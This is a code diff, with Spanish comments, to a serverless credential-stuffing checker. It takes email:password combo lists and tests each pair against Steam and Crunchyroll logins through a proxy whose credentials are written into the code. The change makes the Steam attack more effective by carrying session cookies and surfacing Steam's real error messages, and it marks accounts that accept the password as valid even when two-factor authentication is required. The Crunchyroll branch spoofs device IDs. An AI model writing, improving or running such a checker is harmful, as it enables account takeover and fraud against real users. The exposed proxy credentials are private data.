@@ -15,7 +15,6 @@ exports.handler = async (event) => {
 
     const proxies = [
         'http://poxweudy:pvma7be69xzy@45.38.107.97:6014'
-        // Acá podés meter más proxies de otros países
     ];
 
     try {
@@ -26,7 +25,6 @@ exports.handler = async (event) => {
             if (!combo.includes(':')) continue;
             const [email, password] = combo.split(':');
 
-            // Elegimos un proxy al azar
             const proxyUrl = proxies[Math.floor(Math.random() * proxies.length)];
             const agent = new HttpsProxyAgent(proxyUrl);
             
@@ -35,18 +33,25 @@ exports.handler = async (event) => {
 
             if (service === 'steam') {
                 try {
-                    // 1. Steam necesita la llave RSA primero
-                    const rsaRes = await axios.get(`https://store.steampowered.com/login/getrsakey/?username=${encodeURIComponent(email)}`, { httpsAgent: agent, timeout: 10000 });
+                    // 1. AGARRAMOS LA COOKIE DE SESIÓN Y EL RSA
+                    const initRes = await axios.get('https://store.steampowered.com/login/', { httpsAgent: agent, timeout: 10000 });
+                    const cookies = initRes.headers['set-cookie'] ? initRes.headers['set-cookie'].map(c => c.split(';')[0]).join('; ') : '';
+                    
+                    const rsaRes = await axios.get(`https://store.steampowered.com/login/getrsakey/?username=${encodeURIComponent(email)}`, { 
+                        headers: { 'Cookie': cookies },
+                        httpsAgent: agent, 
+                        timeout: 10000 
+                    });
                     
                     if (rsaRes.data && rsaRes.data.success) {
-                        // 2. Encriptamos la contraseña
+                        // 2. ENCRIPTAMOS LA CLAVE
                         const pubKey = forge.pki.rsa.setPublicKey(
                             new forge.jsbn.BigInteger(rsaRes.data.publickey_mod, 16),
                             new forge.jsbn.BigInteger(rsaRes.data.publickey_exp, 16)
                         );
                         const encryptedPass = forge.util.encode64(pubKey.encrypt(password));
 
-                        // 3. Mandamos el login
+                        // 3. MANDAMOS EL LOGIN
                         const loginRes = await axios.post('https://store.steampowered.com/login/dologin/', 
                             new URLSearchParams({
                                 username: email,
@@ -55,7 +60,10 @@ exports.handler = async (event) => {
                                 remember_login: 'true'
                             }).toString(),
                             { 
-                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                                headers: { 
+                                    'Content-Type': 'application/x-www-form-urlencoded',
+                                    'Cookie': cookies
+                                },
                                 httpsAgent: agent, 
                                 timeout: 15000 
                             }
@@ -68,14 +76,15 @@ exports.handler = async (event) => {
                             isValid = true;
                             reason = 'Válida (Pide 2FA)';
                         } else {
-                            reason = loginRes.data.message || 'Credenciales inválidas';
+                            // ACÁ TE ESCUPE EL ERROR REAL DE STEAM
+                            reason = 'Error Steam: ' + (loginRes.data.message || JSON.stringify(loginRes.data));
                         }
                     }
                 } catch (e) {
-                    reason = 'Error de red/proxy';
+                    reason = 'Error de proxy/red: ' + e.message;
                 }
             } else {
-                // Lógica de Crunchyroll (la que ya teníamos)
+                // Lógica de Crunchyroll
                 const randomDeviceId = crypto.randomBytes(16).toString('hex');
                 const randomDeviceName = 'SM-G' + Math.floor(Math.random() * 9000 + 1000);
                 try {
